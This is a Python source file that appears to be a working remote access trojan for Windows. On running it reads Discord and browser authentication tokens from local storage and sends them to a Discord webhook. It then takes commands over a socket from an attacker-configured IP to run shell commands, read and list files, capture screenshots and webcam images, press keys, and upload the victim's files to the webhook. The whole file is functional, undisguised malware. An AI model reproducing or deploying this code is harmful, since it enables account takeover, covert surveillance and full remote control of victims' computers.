import socket
import os
import ast
import ctypes
import re
import json
import webbrowser
import pyautogui
import tempfile
import random
import discord_webhook
import cv2
from dotenv import load_dotenv
from urllib.request import Request, urlopen

s = socket.socket()

load_dotenv()

# START OF CONFIG

startup = False

ip = os.getenv("IP")
port = 8080

WEBHOOK_URL = os.getenv("D_WEBHOOK_URL")

PING = True

# END OF CONFIG

def reset():
    global s
    
    s = socket.socket()
    
def getIP():
    d = str(urlopen('http://checkip.dyndns.com/').read())
    return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    
    message = '@everyone' if PING else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

main()

while True:

    try:
        incoming_message = s.recv(1024)
        incoming_message = incoming_message.decode()
        incoming_message = ast.literal_eval(incoming_message)

        if incoming_message[0] == "vfisd":
            end = str(['vfisd', "Unknown error occured."])

            if os.path.exists(incoming_message[1]):
                myDir = os.listdir(incoming_message[1])
                end = str(['vfisd', myDir])
            else:
                end = str(['vfisd', "Invalid directory provided."])

            end = end.encode()
            s.send(end)

        if incoming_message[0] == "smbwm":
            msgBox = ctypes.windll.user32.MessageBoxW(0, incoming_message[1], incoming_message[2], 4)
            response = "Null"

            if msgBox == 6: response = "Yes"
            if msgBox == 7: response = "No"
            if msgBox == 2: response = "Cancel"

            end = str(['smbwm', response])
            end = end.encode()

            s.send(end)

        if incoming_message[0] == "ewc":
            result = os.popen(incoming_message[1]).read()

            if not result:
                result = "Unknown error occured"

            end = str(['ewc', result])
            end = end.encode()

            s.send(end)
            
        if incoming_message[0] == "rtf":
            end = str(['rtf', "Unknown error occured."])
            
            if os.path.isfile(incoming_message[1]):
                with open(incoming_message[1], 'r') as f:
                    content = f.readlines()
                f.close()
                end = str(['rtf', content])
            else:
                end = str(['rtf', "Invalid path provided."])
                
            end = end.encode()
            s.send(end)
            
        if incoming_message[0] == "ol":
            webbrowser.open(incoming_message[1])
            
            end = str(['ol', "Link executed in web browser."])
            end = end.encode()
            s.send(end)
            
        if incoming_message[0] == "eh":
            pyautogui.hotkey(*incoming_message[1])
            end = str(['eh', "Hotkey executed"])
                
            end = end.encode()
            s.send(end)
            
        if incoming_message[0] == "ecmdc":
            cmd = os.system(incoming_message[1])
            
            if cmd == 0:
                result = "Successfully executed command."
            else:
                result = "Failed to execute command."
            
            end = str(['ecmdc', result])
            end = end.encode()
            s.send(end)
            
        if incoming_message[0] == "tss":
            end = str(['tss', "Unknown error occured."])
            
            screenshot = pyautogui.screenshot()
            
            number = str(random.randint(0,10000))
            directory = tempfile.gettempdir() + "/abc-" + number + ".png"
            
            screenshot.save(directory)

            webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL)

            with open(directory, "rb") as f:
                webhook.add_file(file=f.read(), filename="screenshot.png")

            response = webhook.execute()
            
            if response:
                end = str(['tss', str(response)])
            
            end = end.encode()
            s.send(end)
            
        if incoming_message[0] == "twcs":
            end = str(['twcs', "Unknown error occured."])
            
            try:
                shot = cv2.VideoCapture(int(incoming_message[1]))
            
                result, image = shot.read()
            
                number = str(random.randint(0,10000))
                directory = tempfile.gettempdir() + "/abc-" + number + ".jpg"
            
                cv2.imwrite(directory, image)
            
                webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL)
            
                with open(directory, "rb") as f:
                    webhook.add_file(file=f.read(), filename="shot.png")
                
                response = webhook.execute()
            
                if response:
                    end = str(['twcs', str(response)])
            except:
                break
                
            end = end.encode()
            s.send(end)
            
        if incoming_message[0] == "sftd":
            end = str(['sftd', "Unknown error occured."])
            
            path = incoming_message[1] + "/" + incoming_message[2]
            
            if os.path.isfile(path):
                if os.path.getsize(path) < 7000000:
                    webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL)
                    
                    with open(path, "rb") as f:
                        webhook.add_file(file=f.read(), filename=incoming_message[2])
                        
                    response = webhook.execute()
                    
                    if response:
                        end = str(['sftd', str(response)])
                else:
                    end = str(['sftd', "File size must be less than 7 MB."])
            else:
                end = str(['sftd', "Invalid path provided."])
                          
            end = end.encode()
            s.send(end)
            
    except:
        try:
            s.connect((ip, port))
            hostname = socket.gethostname()
            ip = getIP()
            end = str(['CONN_INFO', hostname, ip])
            end = end.encode()
            s.send(end)
        except:
            reset()